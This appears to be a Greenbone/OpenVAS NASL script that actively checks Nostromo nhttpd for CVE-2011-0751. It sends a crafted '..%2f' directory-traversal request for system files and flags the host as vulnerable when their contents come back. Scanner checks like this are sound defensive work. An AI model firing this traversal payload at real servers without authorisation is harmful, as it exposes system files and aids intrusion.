# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nazgul:nostromo_nhttpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103119");
  script_version("2025-06-06T05:41:39+0000");
  script_tag(name:"last_modification", value:"2025-06-06 05:41:39 +0000 (Fri, 06 Jun 2025)");
  script_tag(name:"creation_date", value:"2011-03-21 13:19:58 +0100 (Mon, 21 Mar 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2011-0751");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Nazgul Nostromo nhttpd < 1.9.4 RCE / Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_nazgul_nostromo_nhttpd_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("nazgul/nostromo_nhttpd/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Nazgul Nostromo nhttpd is prone to a remote command execution
  (RCE) vulnerability because it fails to properly validate user-supplied data.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to access arbitrary files and
  execute arbitrary commands with application-level privileges.");

  script_tag(name:"affected", value:"Nazgul Nostromo nhttpd prior to version 1.9.4.");

  script_tag(name:"solution", value:"Update to version 1.9.4 or later.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210127125244/http://www.securityfocus.com/bid/46880");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121063309/http://www.securityfocus.com/archive/1/517026");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/en/advisories/rt-sa-2011-001/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files();

foreach file (keys(files)) {
  url = "/" + crap(data: "..%2f", length: 10 * 5) + files[file];

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url, url_only: TRUE);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
